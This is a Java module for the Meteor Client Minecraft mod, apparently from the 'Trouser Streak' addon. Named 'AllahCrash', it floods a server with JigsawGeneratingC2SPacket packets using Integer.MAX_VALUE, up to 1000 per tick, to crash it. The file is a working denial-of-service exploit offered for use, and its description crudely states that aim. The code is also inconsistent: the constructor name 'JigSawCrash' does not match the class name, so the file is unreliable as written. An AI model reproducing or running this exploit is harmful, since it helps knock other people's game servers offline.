package pwn.noobs.trouserstreak.modules;

import pwn.noobs.trouserstreak.Trouser;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.JigsawGeneratingC2SPacket;
import net.minecraft.util.math.BlockPos;

public class AllahCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
            .name("amount")
            .description("How many packets to send to the server per tick.")
            .defaultValue(100)
            .min(1)
            .sliderMax(1000)
            .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-disable")
            .description("Disables module on kick.")
            .defaultValue(true)
            .build()
    );

    private final Setting<Boolean> keepJigsaws = sgGeneral.add(new BoolSetting.Builder()
            .name("keep-jigsaws")
            .description("Toggle if it keeps the jigsaws in JigsawGeneratingC2SPacket.")
            .defaultValue(true)
            .build()
    );

    public JigSawCrash() {
        super(Trouser.Main, "Allah-crash", "Fucks up the server in various ways");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        for (int i = 0; i < amount.get(); i++)
            mc.player.networkHandler.sendPacket(new JigsawGeneratingC2SPacket(
                    BlockPos.ORIGIN,
                    Integer.MAX_VALUE,
                    keepJigsaws.get()));
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}
